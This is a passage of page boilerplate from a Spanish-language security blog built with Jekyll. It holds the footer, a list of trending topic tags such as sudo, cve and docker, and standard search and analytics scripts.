class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
